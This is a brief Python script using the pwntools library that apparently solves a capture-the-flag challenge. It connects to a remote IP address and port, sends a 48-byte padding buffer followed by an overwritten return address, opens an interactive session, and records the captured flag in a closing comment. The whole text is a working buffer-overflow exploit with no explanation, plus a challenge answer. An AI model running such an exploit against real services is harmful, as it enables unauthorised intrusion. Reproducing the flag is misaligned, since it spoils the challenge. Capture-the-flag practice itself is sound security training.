import pwn
conn = pwn.remote("44.197.231.105", 3001)
print(conn.recvline())
conn.send(b"A"*48 + b"\x56\x92\x04\x08")
conn.interactive()
# MCA{98a4b4c15f3b1ae77891e12ab412d84fbd3f89e7}